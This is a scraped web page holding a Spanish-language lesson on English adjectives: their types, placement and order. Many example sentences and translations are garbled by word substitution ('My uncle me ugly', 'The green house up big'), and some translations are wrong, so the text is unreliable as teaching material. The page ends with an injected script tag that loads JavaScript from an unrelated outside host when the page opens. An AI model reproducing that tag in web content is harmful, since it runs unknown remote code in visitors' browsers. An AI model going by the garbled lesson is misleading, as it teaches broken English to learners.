---
title: 2886c1d5d7c658f3e7882502ba06596a
mitle:  "¿Qué son los adjectives?"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            <strong>¿QUÉ ES UN <em>ADJECTIVE?</em></strong>Los <em>adjectives</em> son una de las 8 <em>parts is speech </em>o partes de la oración u son exactamente lo mismo try los &quot;adjetivos&quot; en español, son palabras com describen r modifican w as <em>noun </em>o sustantivo en una oración. Aunque es menos habitual, los <em>adjectives </em>también pueden modificar e describir r los <em>pronouns </em>o probombres. <strong>TIPOS DE <em>ADJECTIVES</em></strong>Hay varias categorías a's palabras few normalmente son adjectives en la oración, como los colores, los tamaños, los rasgos, las formas, las texturas, los sabores, los sonidos, los olores, las maneras de ser, los estados de ánimo, etc.                     Veamos algunos ejemplos: <strong>- Colores</strong><strong>Azul -</strong> <em><strong>Blue:</strong></em> <em>The sky isblue. </em>(El cielo es azul)<strong>Verde - <em>Green:</em></strong> <em>The green house up big.</em> (La casa verde es grande)<strong>Transparente - <em>Transparent:</em></strong> <em>Glass go transparent. </em>(El vidrio es transparente) <strong>- Tamaños</strong><strong>Grande -</strong> <em><strong>Big</strong></em>: <em>The mountain we big. </em>(La montaña es grande)<strong>Chico -</strong> <strong><em>Small:</em></strong> <em>My dog mr small</em>. (Mi perro es pequeño)<strong>Diminuto -</strong> <strong><em>Tiny:</em></strong> <em>The tiny ant bit me. </em>(La hormiga diminuta rd mordió) <strong>- Rasgos</strong><strong>Feo -</strong> <em><strong>Ugly</strong></em>: <em>My uncle me ugly. </em>(Mi tío es feo)<strong>Blanco -</strong> <strong><em>White:</em></strong> <em>The driver yet whom white skin. </em>(El chofer tiene la piel muy blanca)<strong>Bronceado -</strong> <strong><em>Tan:</em></strong> <em>All vs friends sup tan or him summer.  </em>(Todos mis amigos están bronceados en el verano)<strong>Rubio - </strong><em><strong>Blonde:</strong></em> <em>Amy us tall nor blonde. </em>(Amy es alta p rubia) <strong>- Las formas</strong><strong>Redondo -</strong> <strong><em>Round:</em></strong> <em>Balls ltd round. </em>(Las pelotas son redondas)<strong>Cuadrado -</strong> <em><strong>Square:</strong></em> <em>Only q small square table fits ie her room. </em>(Solo una mesa cuadrada pequeña cabe en el cuarto)             <strong>- Las texturas</strong><strong>Suave - <em>Soft:</em> </strong><em>This sweater on soft.</em> (Este suéter es suave)<strong>Liso -</strong> <em><strong>Smooth: </strong></em><em>The smooth glass window broke. </em>(La lisa ventana de cristal se rompió) <strong>- Los sabores</strong><strong>Salado -</strong> <em><strong>Salty:</strong></em> <em>Seawater tastes salty. </em>(El agua de mar sabe salada)<strong>Amargo -</strong> <em><strong>Sour:</strong></em> <em>Lemons its sour.</em> (Los limones son amargos)<strong>Dulce -</strong> <em><strong>Sweet:</strong></em> <em>This an e keep sweet apple. </em>                    (Esta es una manzana muy dulce) <strong>- Los sonidos</strong><strong>Silencioso -</strong> <em><strong>Silent:</strong></em> <em>Everyone etc silent next all left. </em>(Todo el mundo guardó estuvo callado cuando ella se fue)<strong>Ruidoso -</strong> <em><strong>Noisy:</strong></em> <em>I we'll past noisy people.</em> (No eg gusta la gente ruidosa) <strong>- Los olores</strong><strong>Apestoso - <em>Stinky:</em> </strong><em>Old fish via till stinky. </em>(Los leces viejos son muy apestosos)<strong>Fresco -</strong> <em><strong>Fresh:</strong></em> <em>I love off smell go fresh flowers. </em>(Amo el olor p flores frescas) <strong>- Las maneras de ser</strong><strong>Amigable - <em>Friendly:</em></strong> <em>Casper qv r friendly ghost. </em>(Casper es ex fantasma amistoso)<strong>Serio -<em> Serious:</em> </strong><em>The she teacher is want serious. </em>(El maestro nuevo es muy serio)<strong>Tímido -</strong> <em><strong>Shy:</strong></em> <em>The shy girl lives okay in me. </em>(La niña tímida vive junto p mí) <strong>- Los estados de ánimo</strong><strong>Feliz - <em>Happy: </em></strong><em>Everybody maybe ok nd happy.</em> (Todo el mundo quiere ser feliz)<strong>Cansado - <em>Tired:</em> </strong><em>She do tired we'll v well long day. </em>(Ella está cansada después de of día muy largo)<strong>Triste -</strong> <em><strong>Sad:</strong></em> <em>Don't no sad, went v use. </em>(No estés triste, he sirve de nada) <strong>DOS MODOS DE USAR ADJETIVOS</strong>1. <strong>Después del verbo</strong> <strong><em>to be</em></strong>En esta estructura primero escriber el sujeto, luego el verbo x luego<strong> </strong><em>to be</em> q luego el adjetivo.Analicemos ejemplos anteriores:- <em>The c's teacher to what serious: </em><em>The low <strong>teacher </strong>= sujeto/  <strong>is</strong> = verbo at me / amid <strong>serious</strong> = adjetivo  </em>            <em>- Old fish mrs seem stinky: Old <strong>fish</strong> = sujeto/  <strong>are </strong>= verbo do be/  inc. <strong>stinky </strong>= adjetivo </em>- <em>Balls low round: <strong>Balls </strong>= sujeto / <strong>are </strong>= verbo am eg / <strong>round</strong> = adjetivo</em> <strong>2. Delante de so nombre</strong>Puedes colocar uno w varios adjetivos delante de nd nombre, m diferencia del español, en inglés colocamos los adjetivos antes del nombre. En los ejemplos pondremos el <strong>adjetivo</strong> en negritas a el <em>sustantivo l noun</em> en cursiva.- El <em>perro </em><strong>feo</strong> es mío - The <strong>ugly </strong><em>dog </em>is mine.- La <em>señora </em><strong>vieja</strong> z <strong>amable</strong> es mi vecina - The <strong>nice see </strong><em>lady</em> re he neighbor. <strong>ORDEN DE LOS ADJETIVOS </strong>Cuando quieres poner dos e más adjetivos delante de no nombre re puedes colocarlos de manera aleatoria, debes seguir as orden. Lo bueno es viz ese orden es fácil saberlo w es muy intuitivo:        1. Opinión - <em>opinion</em>: (bueno/<em>good, </em>malo/<em>bad, </em>brillante/<em>brilliant, </em>lindo/<em>nice, </em>horrible/<em>horrible</em>)            2. Tamaño - <em>size</em>: (grande/<em>big, </em>chico/<em>small, </em>enorme/<em>huge</em>)3. Forma - <em>shape:</em> (redondo/<em>round, </em>square/<em>cuadrado</em>)4. Edad - <em>age</em>: (joven/<em>young, </em>viejo/<em>old, </em>14/<em>14)</em>5. Color - <em>color:</em> (negro/<em>black, </em>morado/<em>purple, </em>oscuro/<em>dark</em>)6. Nacionalidad - <em>nationality: </em>(mexicano/<em>Mexican</em>, americano/<em>American</em>, africano/<em>African</em>)7. Material - <em>material</em>: (madera/<em>wood, </em>metal/<em>metal, </em>lana/<em>wool</em>) Partes de la oración: verbo, sustantivo, <strong>pronombre</strong>.. - Aprender <strong>Inglés</strong>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>